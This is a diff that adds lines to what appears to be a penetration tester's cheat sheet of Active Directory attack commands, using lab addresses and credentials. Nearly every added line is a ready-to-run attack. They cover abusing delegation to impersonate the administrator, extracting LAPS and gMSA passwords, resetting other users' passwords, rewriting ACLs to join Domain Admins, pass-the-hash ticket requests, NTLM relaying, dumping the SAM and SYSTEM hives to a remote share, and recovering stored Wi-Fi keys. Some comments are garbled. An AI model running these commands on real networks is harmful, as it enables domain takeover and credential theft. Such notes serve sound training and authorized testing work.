@@ -13,6 +13,27 @@ python -c "import hashlib;hash=hashlib.new('md4', '1loggbz'.encode('utf-16le')).
 nxc smb infiltrator.htb --generate-krb5-file infiltrator-krb.conf && sudo cp infiltrator-krb.conf /etc/krb5.conf && KRB5CCNAME=user.ccache evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb	# REALM # Access Winrm kerberos
 ntdissector -ntds NTDS.dit -system SYSTEM -outputdir /tmp/ntdissector/ -ts -f all	# Dump user objects and include deleted records
 rusthound-ce -d DOMAIN.LOCAL -u USERNAME@DOMAIN.LOCAL -z	# bllodhound-ce |  collect domain objects and obtain the zip archive | ADCS included
+impacket-lookupsid ignite.local/krishna:Password@1@192.168.1.14		# Enumerate sids
+impacket-GetADUsers ignite.local/Administrator:Ignite@987 -dc-ip 192.168.1.14 -all		# query Ac�ve Directory users
+impacket-GetADComputers ignite.local/aarti:Password@1 -dc-ip 192.168.1.14		# Enumerate AD Computers
+impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computerpass Password@123 -dc-ip 192.168.1.14		# Abuse MachineAccountQuota to create a computer account
+impacket-rbcd ignite.local/geet:Password@1 -action write -delegate-to 'DC$' -delegate-from 'fakepc$' -dc-ip 192.168.1.14	# Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties
+impacket-getST ignite.local/'farzipc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.14	#  obtain a Service Ticket (ST) for impersona�on
+impacket-GetLAPSPassword ignite.local/aarti:Password@1 -dc-ip 192.168.1.14	# Local Administrator Password Solution (LAPS) Extraction
+Impacket-secretsdump ignite.local/komal:Password@1@192.168.1.14 | grep GMSA 	# query the gMSA password
+impacket-changepasswd ignite.local/panther@192.168.1.14 -newpass Password@1234 -altuser ignite.local/suri -altpass Password@1 -reset	# change the password of a user account
+impacket-changepasswd ignite.local/komal@192.168.1.14 -newpass ‘Password@987’ -p rpc-samr	# changepassword can also be used to change current user password
+impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.14 	# changing ownership of a directory object
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local''ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.14	#  modify the Discre�onary Access Control List (DACL) of an AD object
+bloodyAD --host "192.168.1.14" -d "ignite.local" -u "aaru" -p "Password@1" add groupMember "Domain Admins" "aaru"	# adding Aaru User into the Domain Admin group
+impacket-getTGT -dc-ip 192.168.1.14 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator	# request a TGT
+impacket-describeTicket Administrator.ccache	# Convert an NTLM hash into a Kerberos TGT for stealthier access.
+impacket-ticketConverter Administrator.ccache admin.kirbi	# convert kirbi files (commonly used by mimikatz) into ccache
+impacket-ntlmrelayx -t ldap://192.168.1.14 --shadow-credentials --shadow-target 'dc$'	# msDSKeyCredentialLink atribute |  launch ntlmrelayx with the “–shadow-creden�als” op�on and the “–shadow-target” parameter set to the name of the computer account that we are expec�ng to relay
+impacket-reg ignite.local/aarav:Password@1@192.168.1.48 backup -o '\\192.168.1.16\share' 	#  dump the SAM and SYSTEM hives from the target machine, using the impacket-reg tool
+netsh wlan show profile name=<SSID Name> key=clear	# know the passwords of any one of the mencioned SSIDs
+lazagne.exe wifi	# retrieve all the passwords stored in your machine WIFI
+
 
 # RUBEUS
 
